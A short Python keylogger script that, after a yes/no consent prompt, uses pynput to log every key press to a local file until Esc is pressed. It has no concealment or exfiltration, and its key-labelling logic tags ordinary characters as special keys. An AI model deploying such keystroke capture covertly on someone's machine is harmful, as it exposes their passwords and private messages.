import pynput.keyboard

user_consent = input("If you want to start, type yes else no(y/n): ")
if user_consent.lower() not in ['y', 'yes']:
    print("Keylogger recording stopped.")
    exit()

log_file = "keylog.txt"

def on_press(key):
    try:
        key_output = str(key)
        if isinstance(key, pynput.keyboard.KeyCode):
            key_output = f"Special key: {key.char if key.char else key.name}"

        with open(log_file, 'a') as f:
            f.write(f"{key_output}\n")
    except Exception as e:
        print(f'Error: {e}')

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
